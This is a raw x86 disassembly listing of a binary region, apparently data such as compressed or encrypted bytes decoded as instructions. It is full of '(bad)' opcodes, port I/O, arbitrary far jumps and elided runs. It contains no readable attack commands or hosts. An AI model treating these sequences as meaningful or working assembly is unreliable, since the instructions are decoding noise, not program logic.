  422a46:	ret    0x6700
  422a49:	sbb    eax,0x7121d797
  422a4e:	out    0x54,al
  422a50:	push   ds
  422a51:	sbb    cl,BYTE PTR [edx+0x5f]
  422a54:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422a55:	imul   edx,DWORD PTR [ecx+0x25],0xffffffbe
  422a59:	jg     0x422a6d
  422a5b:	sbb    DWORD PTR [ebx],edi
  422a5d:	push   ebx
  422a5e:	sub    esp,ecx
  422a60:	shr    ecx,1
  422a62:	adc    eax,DWORD PTR [ebx-0x336d4adc]
  422a68:	xlat   BYTE PTR ds:[ebx]
  422a69:	or     DWORD PTR [ecx+0x91acd7],ecx
	...
  422ad3:	add    BYTE PTR [eax],al
  422ad5:	add    BYTE PTR [esi-0x377e796],dl
  422adb:	cli    
  422adc:	xchg   esi,eax
  422add:	jle    0x422ab0
  422adf:	push   esp
  422ae0:	je     0x422a9f
  422ae2:	std    
  422ae3:	push   0xffffff94
  422ae5:	add    al,0x67
  422ae7:	je     0x422aea
  422ae9:	add    BYTE PTR [eax],al
  422aeb:	add    DWORD PTR [eax],eax
  422aed:	add    BYTE PTR [ebx],bl
  422aef:	cdq    
  422af0:	stos   DWORD PTR es:[edi],eax
  422af1:	add    eax,DWORD PTR [ecx+0x7f4394cc]
  422af7:	test   eax,0x62c51efa
  422afc:	lds    esp,FWORD PTR [edx+0x45bc3d60]
  422b02:	push   esi
  422b03:	pop    esi
  422b04:	daa    
  422b05:	cmc    
  422b06:	(bad)  
  422b07:	xchg   ebp,eax
  422b08:	add    esi,DWORD PTR [edi-0x78]
  422b0b:	mov    esi,0x71858cb6
  422b10:	(bad)  
  422b11:	cs loopne 0x422b70
  422b14:	sbb    edi,esp
  422b16:	or     bl,BYTE PTR [ebx+0x11]
  422b19:	sti    
  422b1a:	mov    eax,0xab19cf43
  422b1f:	sub    al,bl
  422b21:	push   esi
  422b22:	ins    DWORD PTR es:[edi],dx
  422b23:	pusha  
  422b24:	in     al,0x81
  422b26:	fmulp  st(1),st
  422b28:	pop    ss
  422b29:	retf   0xac23
  422b2c:	ret    0xc3a9
  422b2f:	adc    BYTE PTR es:[ebx-0x7cba1310],cl
  422b36:	xchg   ebx,eax
  422b37:	daa    
  422b38:	jno    0x422b83
  422b3a:	(bad)  
  422b3b:	das    
  422b3c:	imul   ebp,ebx,0x7f9e8a45
  422b42:	pop    ds
  422b43:	fstp   QWORD PTR [ebx-0x6d]
  422b46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b47:	test   eax,0xb7dc7c1
  422b4c:	mov    ch,0xc7
  422b4e:	mov    bh,0xbf
  422b50:	in     eax,dx
  422b51:	cmp    al,0x19
  422b53:	std    
  422b54:	and    DWORD PTR [edx-0x6f],edi
  422b57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b58:	ja     0x422b5f
  422b5a:	mov    ecx,0x8da50ffd
  422b5f:	jno    0x422b5b
  422b61:	clc    
  422b62:	xor    ebp,DWORD PTR [edi]
  422b64:	ret    0x2ae7
  422b67:	cli    
  422b68:	out    dx,al
  422b69:	push   0x3519e6b8
  422b6e:	and    ebx,DWORD PTR [edi-0x1fbedcd7]
  422b74:	(bad)  
  422b75:	fcomp  DWORD PTR [edx+0x5]
  422b78:	inc    ebp
  422b79:	imul   edi,DWORD PTR [ecx],0xffffffca
  422b7c:	or     eax,DWORD PTR [eax+eiz*1+0x3c]
  422b80:	cli    
  422b81:	bound  esi,QWORD PTR [ecx+0x686f4bbe]
  422b87:	out    0xd1,al
  422b89:	ins    DWORD PTR es:[edi],dx
  422b8a:	mov    ds:0x25a884a0,al
  422b8f:	inc    esi
  422b90:	sbb    DWORD PTR [esi],esp
  422b92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b93:	outs   dx,DWORD PTR ds:[esi]
  422b94:	and    al,BYTE PTR [ecx+esi*4]
  422b97:	push   eax
  422b98:	and    BYTE PTR [ebp+0x4f],cl
  422b9b:	mov    ecx,esp
  422b9d:	ja     0x422c0b
  422b9f:	fcom   QWORD PTR [ebx+0x59]
  422ba2:	mov    edi,0x609315b4
  422ba7:	xor    esi,esi
  422ba9:	sub    esi,ebx
  422bab:	lea    edx,[edx]
  422bad:	ret    
  422bae:	xor    edx,DWORD PTR ds:0x6722881c
  422bb4:	cmc    
  422bb5:	adc    BYTE PTR [ecx+0x36],ch
  422bb8:	adc    BYTE PTR [ebx],0x47
  422bbb:	push   edx
  422bbc:	imul   edi,DWORD PTR [ecx],0xffffffe4
  422bbf:	je     0x422bd7
  422bc1:	xchg   edx,eax
  422bc2:	ds dec edx
  422bc4:	jmp    0xb527:0x35c0b911
  422bcb:	or     bl,bh
  422bcd:	mov    esi,DWORD PTR [ecx]
  422bcf:	cmp    BYTE PTR [eiz*1-0x6a7e6fce],0x3f
  422bd7:	ss icebp 
  422bd9:	push   es
  422bda:	stos   BYTE PTR es:[edi],al
  422bdb:	cwde   
  422bdc:	cmp    BYTE PTR [edi+0x12],bh
  422bdf:	push   edx
  422be0:	test   eax,0x90809d2a
  422be5:	imul   eax,DWORD PTR [ebp+0x17],0x43
  422be9:	add    al,0x5a
  422beb:	add    eax,0x3c63
	...
  422c54:	add    BYTE PTR [eax],al
  422c56:	inc    esp
  422c57:	aaa    
  422c58:	dec    edx
  422c59:	fwait
  422c5a:	jnp    0x422c5b
  422c5c:	aad    0xff
  422c5e:	sbb    dl,BYTE PTR [edx-0x5d51b264]
  422c64:	ficom  WORD PTR [edi+eiz*2+0x175]
  422c6b:	add    DWORD PTR [eax],eax
  422c6d:	add    dl,bl
  422c6f:	fs or  al,0x2b
  422c72:	shl    cl,1
  422c74:	push   ebp
  422c75:	xor    eax,0xcf2f8c42
  422c7a:	adc    eax,ebp
  422c7c:	jl     0x422c2a
  422c7e:	pop    esp
  422c7f:	pop    esp
  422c80:	sub    eax,0x3dd50767
  422c85:	stos   BYTE PTR es:[edi],al
  422c86:	dec    esp
  422c87:	dec    esp
  422c88:	ds pop ecx
  422c8a:	nop    DWORD PTR [ecx+0x6a3ce1a8]
  422c91:	call   0xfe041e6b
  422c96:	icebp  
  422c97:	cmp    eax,0x9abb506a
  422c9c:	in     eax,dx
  422c9d:	push   0x51
  422c9f:	and    BYTE PTR [ebx+0x64],al
  422ca2:	int    0x7c
  422ca4:	push   ds
  422ca5:	xchg   edx,eax
  422ca6:	(bad)  
  422ca7:	pop    edx
  422ca8:	dec    esi
  422ca9:	imul   ebx,edi,0x4d69f7c
  422caf:	inc    edi
  422cb0:	imul   esi,DWORD PTR [edi-0x73],0xcc10f7e
  422cb7:	pop    ecx
  422cb8:	in     eax,dx
  422cb9:	dec    esp
  422cba:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  422cbc:	out    0xd7,eax
  422cbe:	jge    0x422c44
  422cc0:	and    edx,DWORD PTR [edx]
  422cc2:	jp     0x422c97
  422cc4:	ror    DWORD PTR [edx],1
  422cc6:	jg     0x422d22
  422cc8:	sub    eax,0xa34365f0
  422ccd:	call   esp
  422ccf:	out    dx,eax
  422cd0:	lahf   
  422cd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422cd2:	stc    
  422cd3:	adc    BYTE PTR [eax-0x37277e4a],bh
  422cd9:	imul   ecx,DWORD PTR [edi],0xb5a0b2ee
  422cdf:	ins    DWORD PTR es:[edi],dx
  422ce0:	and    al,0xce
  422ce2:	nop
  422ce3:	adc    cl,BYTE PTR [ecx+0x11]
  422ce6:	mov    bh,0x66
  422ce8:	fiadd  WORD PTR [edi+0x5702385]
  422cee:	ror    BYTE PTR [edi+0x45],cl
  422cf1:	iret   
  422cf2:	test   al,0xf7
  422cf4:	xor    bl,BYTE PTR [esi+0x1f]
  422cf7:	jo     0x422d3d
  422cf9:	mov    dl,0xc6
  422cfb:	add    dl,al
  422cfd:	push   esp
  422cfe:	and    BYTE PTR [ecx+0x16],cl
  422d01:	repnz mov edx,0xdc3ab1d9
  422d07:	lahf   
  422d08:	mul    BYTE PTR [esi-0x3ebbd1b]
  422d0e:	int    0x83
  422d10:	dec    ecx
  422d11:	aad    0x13
  422d13:	mov    al,0x4
  422d15:	(bad)  
  422d16:	mov    eax,ds:0x1426f149
  422d1b:	dec    esp
  422d1c:	and    ah,BYTE PTR [ebx+ebp*8+0x7eb2d513]
  422d23:	push   esp
  422d24:	or     DWORD PTR [esi],edi
  422d26:	std    
  422d27:	push   ebp
  422d28:	lods   eax,DWORD PTR ds:[esi]
  422d29:	mov    dl,BYTE PTR [eax]
  422d2b:	sti    
  422d2c:	sub    dh,BYTE PTR [esi-0x589cfb66]
  422d32:	cdq    
  422d33:	push   ds
  422d34:	push   ecx
  422d35:	jno    0x422cea
  422d37:	lods   al,BYTE PTR ds:[esi]
  422d38:	mov    ch,0x2f
  422d3a:	imul   ebp,DWORD PTR [ebx+0x540eb497],0x3a
  422d41:	inc    ecx
  422d42:	jmp    0x4da:0x9227e951
  422d49:	push   edx
  422d4a:	mov    bh,0x3
  422d4c:	adc    eax,0x25d17827
  422d51:	and    DWORD PTR [edi],ebp
  422d53:	push   ecx
  422d54:	xchg   ebp,eax
  422d55:	dec    esp
  422d56:	retf   
  422d57:	int    0x9d
  422d59:	cld    
  422d5a:	push   0x9f8ff7ce
  422d5f:	loope  0x422d17
  422d61:	ins    DWORD PTR es:[edi],dx
  422d62:	loopne 0x422cf6
  422d64:	lods   eax,DWORD PTR ds:[esi]
  422d65:	pop    ss
  422d66:	pop    edi
  422d67:	test   al,0xf6
  422d69:	adc    eax,eax
  422d6b:	(bad)  
  422d6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d6d:	mov    ds:0x0,eax
	...
  422dd6:	mov    edi,0x626d60bd
  422ddb:	std    
  422ddc:	mov    edi,0x80797fff
  422de1:	sub    edi,ebx
  422de3:	push   ss
  422de4:	xor    al,0xaf
  422de6:	addr16 jbe 0x422dea
  422de9:	add    BYTE PTR [eax],al
  422deb:	add    DWORD PTR [eax],eax
  422ded:	add    bh,bh
  422def:	pop    edi
  422df0:	jno    0x422d95
  422df2:	and    eax,0x213e212
  422df7:	sub    ebx,DWORD PTR [edi+0x4c]
  422dfa:	and    ebp,DWORD PTR ds:0xad136e79
  422e00:	sbb    BYTE PTR [eax+0x66],ah
  422e03:	add    BYTE PTR [esi-0x7],0x4b
  422e07:	pop    ecx
  422e08:	or     eax,DWORD PTR [edi]
  422e0a:	cmp    eax,0xc32fb757
  422e0f:	push   edi
  422e10:	cdq    
  422e11:	xor    ebp,esp
  422e13:	loopne 0x422e39
  422e15:	cmp    al,0x82
  422e17:	popa   
  422e18:	pop    ebp
  422e19:	or     BYTE PTR [ecx-0x40],ah
  422e1c:	iret   
  422e1d:	mov    ebx,esp
  422e1f:	and    ah,ch
  422e21:	xchg   esp,eax
  422e22:	hlt    
  422e23:	pop    ebp
  422e24:	rol    BYTE PTR [eax+eax*4+0x4a],0xa1
  422e29:	imul   esp,DWORD PTR [edx+0x45b963f],0x2d
  422e30:	xchg   ebx,eax
  422e31:	push   ds
  422e32:	cs iret 
  422e34:	cmp    al,0xa8
  422e36:	push   ss
  422e37:	mov    al,0x75
  422e39:	add    al,0x38
  422e3b:	imul   edi,DWORD PTR [ebp-0x16],0x38
  422e3f:	in     eax,dx
  422e40:	aaa    
  422e41:	cmp    ebx,ebx
  422e43:	fistp  DWORD PTR [ebx]
  422e45:	mov    ah,BYTE PTR [ebp-0x6c]
  422e48:	arpl   WORD PTR [ecx-0x2e],bp
  422e4b:	div    BYTE PTR [ebx-0xae3f0b8]
  422e51:	cmp    edx,DWORD PTR [esi-0xfb1a15]
  422e57:	mov    eax,ds:0x6052f196
  422e5c:	xchg   ebx,eax
  422e5d:	(bad)  
  422e5e:	call   0x35b9:0x41297ba1
  422e65:	inc    edx
  422e66:	push   ds
  422e67:	imul   BYTE PTR gs:[eax-0xf]
  422e6b:	mov    dl,0x21
  422e6d:	icebp  
  422e6e:	pop    edx
  422e6f:	rcr    BYTE PTR [edi],cl
  422e71:	iret   
  422e72:	dec    edi
  422e73:	jl     0x422e4d
  422e75:	sbb    al,0xf8
  422e77:	lds    esi,FWORD PTR [edi]
  422e79:	repnz das 
  422e7b:	sub    DWORD PTR [ecx-0x67],edi
  422e7e:	call   0xe0941130
  422e83:	daa    
  422e84:	jbe    0x422ece
  422e86:	pop    ebp
  422e87:	or     bl,BYTE PTR [ebp+0x3360f623]
  422e8d:	jmp    0x422eeb
  422e8f:	pusha  
  422e90:	adc    esp,DWORD PTR [ebp-0x4eaff405]
  422e96:	nop
  422e97:	or     esp,ecx
  422e99:	add    DWORD PTR [ebx+0x8],ebp
  422e9c:	pop    esi
  422e9d:	sar    DWORD PTR [esi+0x27],1
  422ea0:	scas   al,BYTE PTR es:[edi]
  422ea1:	in     al,0xd9
  422ea3:	jb     0x422e97
  422ea5:	popf   
  422ea6:	push   edi
  422ea7:	inc    edx
  422ea8:	aad    0x6d
  422eaa:	jno    0x422e5c
  422eac:	dec    DWORD PTR [esi+0x1ce7d775]
  422eb2:	dec    eax
  422eb3:	pop    ebp
  422eb4:	jp     0x422e77
  422eb6:	mov    bh,0xd2
  422eb8:	xor    al,al
  422eba:	loop   0x422f10
  422ebc:	cmp    esi,ecx
  422ebe:	cs jnp 0x422efe
  422ec1:	fidivr DWORD PTR [edi+0x58]
  422ec4:	jo     0x422f1f
  422ec6:	shl    dl,cl
  422ec8:	ficom  WORD PTR [edx+0x71]
  422ecb:	mov    bh,0x8c
  422ecd:	pop    ebp
  422ece:	in     al,dx
  422ecf:	xchg   ebp,eax
  422ed0:	xor    eax,0x1322b372
  422ed5:	cdq    
  422ed6:	add    BYTE PTR [esp+edx*1],al
  422ed9:	les    ebp,FWORD PTR [esi-0x5e]
  422edc:	and    ebp,DWORD PTR [esi-0x22bd274]
  422ee2:	pop    ebx
  422ee3:	jae    0x422f00
  422ee5:	jmp    0xa0a8:0xe8e72e5e
  422eec:	pop    ds
  422eed:	push   esi
	...
  422f56:	adc    DWORD PTR [ebp-0x78],0x19
  422f5a:	(bad)  
  422f5c:	xchg   ebx,eax
  422f5d:	fisttp WORD PTR [eax]
  422f5f:	mov    eax,0x741eca33
  422f64:	pop    ebx
  422f65:	pusha  
  422f66:	addr16 ja 0x422f6a
  422f69:	add    BYTE PTR [eax],al
  422f6b:	add    DWORD PTR [eax],eax
  422f6d:	add    BYTE PTR [ecx],ch
  422f6f:	pop    si
  422f71:	fcmovne st,st(1)
  422f73:	mov    ebp,0xdf74c616
  422f78:	or     al,0x16
  422f7a:	call   DWORD PTR [eax]
  422f7c:	(bad)  
  422f7d:	xor    DWORD PTR [esi-0x35],esp
  422f80:	ja     0x422f95
  422f82:	push   ds
  422f83:	scas   al,BYTE PTR es:[edi]
  422f84:	add    eax,0x1228d06f
  422f89:	mov    ds:0xc5c6e361,eax
  422f8e:	pop    ebp
  422f8f:	icebp  
  422f90:	dec    edi
  422f91:	fisub  DWORD PTR [ecx+0x20]
  422f94:	and    al,0xf5
  422f96:	rol    BYTE PTR [esi],cl
  422f98:	(bad)  
  422f99:	cmp    DWORD PTR [esi],0x29
  422f9c:	and    BYTE PTR [esi-0x5c],cl
  422f9f:	xor    BYTE PTR [eax+0x38],ah
  422fa2:	pop    edi
  422fa3:	lds    esp,FWORD PTR ds:0xa254fc6a
  422fa9:	dec    esp
  422faa:	ins    BYTE PTR es:[edi],dx
  422fab:	xchg   esi,eax
  422fac:	loop   0x423017
  422fae:	retf   
  422faf:	jmp    0x422f98
  422fb1:	push   ds
  422fb2:	les    eax,FWORD PTR [eax+eax*4+0x37c64ed7]
  422fb9:	pop    ebx
  422fba:	aaa    
  422fbb:	adc    eax,0x3df2ca01
  422fc0:	push   edi
  422fc1:	jecxz  0x423017
  422fc3:	je     0x422fb5
  422fc5:	sahf   
  422fc6:	dec    ebx
  422fc7:	mov    dl,0x68
  422fc9:	(bad)
  422fcc:	adc    ch,BYTE PTR [esi+0x11]
  422fcf:	ins    DWORD PTR es:[edi],dx
  422fd0:	xchg   ebx,eax
  422fd1:	adc    eax,DWORD PTR [eax-0x58]
  422fd4:	stc    
  422fd5:	mov    ebp,DWORD PTR [edx-0x3a]
  422fd8:	test   eax,0x80faa4d9
  422fdd:	pop    esp
  422fde:	shr    ebp,1
  422fe0:	inc    edx
  422fe1:	popf   
  422fe2:	pop    es
  422fe3:	mov    eax,ds:0xc18155e7
  422fe8:	sub    al,0xcf
  422fea:	mov    edx,0x47c87984
  422fef:	out    dx,eax
  422ff0:	je     0x423042
  422ff2:	leave  
  422ff3:	push   eax
  422ff4:	lods   al,BYTE PTR ds:[esi]
  422ff5:	mov    dl,0x66
  422ff7:	or     BYTE PTR [esi+0x20],dh
  422ffa:	mul    DWORD PTR [esi-0x723074d5]
  423000:	scas   eax,DWORD PTR es:[edi]
  423001:	jo     0x422fed
  423003:	stos   BYTE PTR es:[edi],al
  423004:	aas    
  423005:	addr16 fwait
  423007:	or     BYTE PTR [ebx+0x5f592d5f],bh
  42300d:	lock pop eax
  42300f:	pop    eax
  423010:	shl    BYTE PTR [ebp-0x7fdf080b],0xa2
  423017:	lods   al,BYTE PTR ds:[esi]
  423018:	scas   eax,DWORD PTR es:[edi]
  423019:	jae    0x42308f
  42301b:	inc    eax
  42301c:	mov    bl,0x3
  42301e:	xchg   esp,eax
  42301f:	mov    eax,ds:0xd5048ab8
  423024:	mov    BYTE PTR [edi],dl
  423026:	xchg   BYTE PTR [ebp+0x10cdc8eb],dh
  42302c:	push   cs
  42302d:	push   cs
  42302e:	stc    
  42302f:	mov    DWORD PTR [ebx-0x1e],ebx
  423032:	ret    0xb985
  423035:	dec    esp
  423036:	pop    ebp
  423037:	xor    esi,DWORD PTR [ebx]
  423039:	pop    esp
  42303a:	cs and eax,0x941e23dc
  423040:	fst    DWORD PTR [edx]
  423042:	sub    edi,0x2b796276
  423048:	test   BYTE PTR [eax],0xba
  42304b:	out    dx,eax
  42304c:	dec    edx
  42304d:	shl    DWORD PTR [edi-0x5a101ada],1
  423053:	test   al,0xd2
  423055:	repnz or esi,DWORD PTR [esp+ebx*4]
  423059:	push   ss
  42305a:	mov    al,0xdf
  42305c:	ss popa 
  42305e:	push   ss
  42305f:	pop    edx
  423060:	sbb    al,0x1a
  423062:	(bad)  
  423063:	jmp    0x8064:0x8bd5e018
  42306a:	push   esp
  42306b:	and    esi,DWORD PTR [ebx]
  42306d:	xchg   DWORD PTR [eax],eax
	...
  4230d3:	add    BYTE PTR [eax],al
  4230d5:	add    BYTE PTR [esi-0x1c],al
  4230d8:	bound  ecx,QWORD PTR [eax-0x1111711e]
  4230de:	sub    ecx,ebx
  4230e0:	sbb    DWORD PTR [ebx+ecx*4+0x672bdeab],esp
  4230e7:	js     0x4230ea
  4230e9:	add    BYTE PTR [eax],al
  4230eb:	add    DWORD PTR [eax],eax
  4230ed:	add    al,al
  4230ef:	inc    esp
  4230f0:	inc    edi
  4230f1:	pushf  
  4230f2:	mov    esp,0x4af246f3
  4230f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4230f8:	repz mov WORD PTR [ecx],es
  4230fb:	std    
  4230fc:	or     DWORD PTR [edi+edi*8+0x74],ebx
  423100:	mov    ds:0x4507ce32,al
  423105:	imul   BYTE PTR [ecx-0x19]
  423108:	sbb    al,BYTE PTR [esi]
  42310a:	das    
  42310b:	bound  ebp,QWORD PTR [ebx+esi*4+0x26df1d11]
  423112:	clc    
  423113:	pusha  
  423114:	sub    esi,ebp
  423116:	jle    0x4230e2
  423118:	cwde   
  423119:	pusha  
  42311a:	sbb    esi,DWORD PTR [edi-0x6d969b54]
  423120:	adc    BYTE PTR [edi],ah
  423122:	and    eax,0x1df34d73
  423127:	add    ah,al
  423129:	xchg   ebx,eax
  42312a:	fstp   QWORD PTR [edi+0x69ee0519]
  423130:	cmp    eax,0x8de4e966
  423135:	setg   BYTE PTR [edx]
  423138:	push   ds
  423139:	pop    esp
  42313a:	addr16 jmp 0xe7c0:0xd95d3213
  423142:	call   0xd951fb7
  423147:	leave  
  423148:	clc    
  423149:	cli    
  42314a:	sub    BYTE PTR [esi],0x30
  42314d:	ret    
  42314e:	nop
  42314f:	(bad)  
  423151:	or     ebx,DWORD PTR [ebx+0x3c33e30d]
  423157:	test   DWORD PTR [edi+0x77],esi
  42315a:	add    eax,0x2572fff1
  42315f:	loope  0x423173
  423161:	data16 icebp 
  423163:	cmp    al,0xfe
  423165:	icebp  
  423166:	dec    ecx
  423167:	pusha  
  423168:	fs adc al,0x66
  42316b:	js     0x42316b
  42316d:	jle    0x4231e5
  42316f:	jno    0x423106
  423171:	mov    cl,BYTE PTR [ebp+0x27129544]
  423177:	cmp    al,0xcc
  423179:	ficom  DWORD PTR [ebx+0x873dd2e]
  42317f:	mov    bh,0xe0
  423181:	pop    ebx
  423182:	clc    
  423183:	stc    
  423184:	pushf  
  423185:	xor    al,0xe6
  423187:	dec    DWORD PTR [eax-0x76]
  42318a:	imul   ecx,DWORD PTR [ecx],0xd4051761
  423190:	clc    
  423191:	mov    bh,BYTE PTR [ebx]
  423193:	popa   
  423194:	loopne 0x4231a7
  423196:	sti    
  423197:	or     al,0x86
  423199:	xchg   DWORD PTR [edi+0x400dd962],eax
  42319f:	add    eax,esi
  4231a1:	sbb    al,0x67
  4231a3:	fwait
  4231a4:	xchg   edi,eax
  4231a5:	inc    edi
  4231a6:	and    al,0x4d
  4231a8:	(bad)  
  4231a9:	dec    esp
  4231aa:	icebp  
  4231ab:	in     al,dx
  4231ac:	int    0x12
  4231ae:	bound  esp,QWORD PTR [esp+ebp*1-0x7d]
  4231b2:	pop    dx
  4231b4:	adc    BYTE PTR [esi-0x66],0x9e
  4231b8:	mov    cl,0x51
  4231ba:	sub    al,0xa3
  4231bc:	in     al,0x51
  4231be:	std    
  4231bf:	loope  0x423214
  4231c1:	(bad)  
  4231c2:	xchg   esi,eax
  4231c3:	call   0x41686384
  4231c8:	and    esp,DWORD PTR [ebx-0x47663f5e]
  4231ce:	add    ecx,DWORD PTR [eax]
  4231d0:	push   esp
  4231d1:	cs jne 0x423168
  4231d4:	xor    DWORD PTR [ebx-0x5a75e2b9],ebp
  4231da:	or     esi,0x9556732b
  4231e0:	adc    DWORD PTR [eax+0x4b5097d5],0x434e363
  4231ea:	(bad)  
  4231eb:	(bad)  
  4231ec:	jmp    0x0:0x56
	...
  423253:	add    BYTE PTR [eax],al
  423255:	add    BYTE PTR [ecx-0xf],bh
  423258:	div    DWORD PTR [ecx-0x6804801]
  42325e:	in     al,0xe0
  423260:	sub    DWORD PTR [edx-0x7a99158d],esp
  423266:	addr16 jns 0x42326a
  423269:	add    BYTE PTR [eax],al
  42326b:	add    DWORD PTR [eax],eax
  42326d:	add    BYTE PTR [edx+0xd],dl
  423270:	shl    BYTE PTR [ebx],0x8c
  423273:	repz clc 
  423275:	or     al,0x5b
  423277:	add    dh,BYTE PTR [ecx-0x21310ea9]
  42327d:	cmp    bl,dh
  42327f:	xor    al,0xf7
  423281:	mov    al,0xf0
  423283:	cmp    DWORD PTR [ebx+0x3f],esi
  423286:	ret    0x90ed
  423289:	adc    BYTE PTR [eax-0x24],ch
  42328c:	gs adc eax,0x20327244
  423292:	rcl    al,1
  423294:	les    edx,FWORD PTR [esi]
  423296:	shl    DWORD PTR [edx],1
  423298:	lock popa 
  42329a:	or     al,BYTE PTR [ecx+0x317d9410]
  4232a0:	inc    eax
  4232a1:	push   ebx
  4232a2:	imul   di,WORD PTR [ebx-0x13],0x17
  4232a7:	adc    al,0xf
  4232a9:	push   es
  4232aa:	mov    bl,0xb6
  4232ac:	aaa    
  4232ad:	das    
  4232ae:	in     al,0x5a
  4232b0:	push   ss
  4232b1:	mov    ah,0xb0
  4232b3:	(bad)  
  4232b4:	jle    0x423313
  4232b6:	(bad)  
  4232b7:	pop    esi
  4232b8:	nop
  4232b9:	in     al,0x3b
  4232bb:	test   eax,0x56b2203b
  4232c0:	sbb    al,0x65
  4232c2:	in     al,0x6c
  4232c4:	stc    
  4232c5:	adc    al,dl
  4232c7:	sahf   
  4232c8:	mov    ah,0x2
  4232ca:	repnz test al,0x40
  4232cd:	xchg   edi,eax
  4232ce:	adc    DWORD PTR [ecx+edi*8],edi
  4232d1:	test   al,0x8f
  4232d3:	and    BYTE PTR [bp+di+0x77],al
  4232d7:	ror    edi,1
  4232d9:	push   ecx
  4232da:	scas   eax,DWORD PTR es:[edi]
  4232db:	imul   ecx
  4232dd:	dec    ebx
  4232de:	(bad)  
  4232df:	xchg   esi,eax
  4232e0:	jnp    0x423315
  4232e2:	scas   eax,DWORD PTR es:[edi]
  4232e3:	jp     0x423357
  4232e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4232e6:	ror    BYTE PTR ds:0x26f6de54,1
  4232ec:	xchg   esi,eax
  4232ed:	mov    ds:0x1003cfc7,al
  4232f2:	data16 cmp BYTE PTR [ebx+0x5f],bl
  4232f6:	adc    bl,BYTE PTR [edi+0x5cb21e47]
  4232fc:	pop    eax
  4232fd:	shl    BYTE PTR [edi+edi*1-0xa],cl
  423301:	gs mov dl,0x64
  423304:	mov    ebp,0xcea9c7a6
  423309:	push   esi
  42330a:	xchg   esi,eax
  42330b:	add    al,0x26
  42330d:	aad    0x48
  42330f:	inc    ebp
  423310:	push   ebx
  423311:	clc    
  423312:	cmp    eax,0x10a7a438
  423317:	pop    ebx
  423318:	test   BYTE PTR [edi],cl
  42331a:	xchg   dh,al
  42331c:	gs pop esi
  42331e:	inc    ebx
  42331f:	out    dx,al
  423320:	add    BYTE PTR [edi+0x7f993500],dh
  423326:	add    eax,eax
  423328:	imul   ebp,DWORD PTR [edx],0x3e0d86fc
  42332e:	repz mov ch,0x51
  423331:	inc    esp
  423332:	call   0xeb79ae2d
  423337:	jecxz  0x42336c
  423339:	inc    ebx
  42333a:	dec    edx
  42333b:	das    
  42333c:	gs pop ss
  42333e:	js     0x423328
  423340:	jge    0x423371
  423342:	push   ebx
  423343:	mov    esi,0x7efff420
  423348:	add    eax,DWORD PTR [ebp+edi*8-0x1ee5c4a2]
  42334f:	div    BYTE PTR [edi-0x1b4098f0]
  423355:	ins    BYTE PTR es:[edi],dx
  423356:	bound  esi,QWORD PTR ds:0xb02e0dfd
  42335c:	push   eax
  42335d:	xchg   esi,eax
  42335e:	fistp  DWORD PTR [bx+si+0x6444]
  423363:	retf   
  423364:	rol    edx,0x33
  423367:	mov    cl,0xc1
  423369:	loope  0x423335
  42336b:	(bad)  
  42336d:	dec    esi
	...
  4233d6:	clc    
  4233d7:	fisub  WORD PTR [edx+0x30]
  4233da:	mov    sp,0xdefa
  4233de:	mov    eax,fs:0x8f4d0f44
  4233e4:	cmp    ebx,ecx
  4233e6:	addr16 jp 0x4233ea
  4233e9:	add    BYTE PTR [eax],al
  4233eb:	add    DWORD PTR [eax],eax
  4233ed:	add    BYTE PTR [edx],bl
  4233ef:	(bad)  [esi]
  4233f1:	and    BYTE PTR [ebp+0x2caead07],dh
  4233f7:	inc    edi
  4233f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4233f9:	shl    DWORD PTR [esi+0x57],1
  4233fc:	push   ebp
  4233fd:	out    dx,al
  4233fe:	and    ah,cl
  423400:	jl     0x423439
  423402:	in     eax,dx
  423403:	dec    ebx
  423404:	popa   
  423405:	xor    al,al
  423407:	leave  
  423408:	jo     0x4233e0
  42340a:	rcr    DWORD PTR [ebx+0x8],0x89
  42340e:	ins    DWORD PTR es:[edi],dx
  42340f:	jp     0x4233ec
  423411:	std    
  423412:	pop    esi
  423413:	mul    DWORD PTR [edi]
  423415:	or     ch,BYTE PTR [esi]
  423417:	int    0x64
  423419:	ret    
  42341a:	rcl    DWORD PTR [eax],1
  42341c:	and    esp,DWORD PTR [ebp-0xc]
  42341f:	jge    0x4233ba
  423421:	out    dx,eax
  423422:	mov    ecx,0x9be5f6de
  423427:	in     eax,dx
  423428:	mov    DWORD PTR [esi-0x62471e1],0x49da750c
  423432:	test   eax,0xf33e1227
  423437:	(bad)  [ebx-0x23a2c77e]
  42343d:	add    esp,DWORD PTR [edx-0x494ef124]
  423443:	xor    DWORD PTR [ebx],0xffffff87
  423446:	repnz fwait
  423448:	jb     0x42343a
  42344a:	lea    esp,[esi-0x7]
  42344d:	dec    esi
  42344e:	dec    ebp
  42344f:	sbb    al,0xd
  423451:	push   sp
  423453:	(bad)  
  423454:	cmc    
  423455:	mov    ?,edx
  423457:	mov    edi,0x752aa4de
  42345c:	adc    eax,0xf5619539
  423461:	sub    ah,0xf8
  423464:	stos   DWORD PTR es:[edi],eax
  423465:	dec    edx
  423466:	dec    ebp
  423467:	scas   eax,DWORD PTR es:[edi]
  423468:	pop    ecx
  423469:	jp     0x423453
  42346b:	pop    esi
  42346c:	addr16 test eax,0x9db1579b
  423472:	nop
  423473:	pop    ecx
  423474:	add    ah,BYTE PTR [edi]
  423476:	jmp    0x6ff7:0x854aae6d
  42347d:	push   eax
  42347e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42347f:	(bad)  
  423480:	push   esp
  423481:	(bad)  
  423482:	mov    eax,0xede6c496
  423487:	shrd   ebp,ecx,cl
  42348a:	xchg   ecx,eax
  42348b:	test   BYTE PTR [edx],0x1c
  42348e:	xor    edi,DWORD PTR [edx-0x232c9c7b]
  423494:	or     esp,DWORD PTR [ecx+eiz*8+0x72079230]
  42349b:	fisttp QWORD PTR [ebx+0x1b]
  42349e:	mov    ebp,0xbf5ddbea
  4234a3:	inc    ebp
  4234a4:	push   0x55910da7
  4234a9:	sbb    DWORD PTR [ebx+eax*4-0x67],esp
  4234ad:	cld    
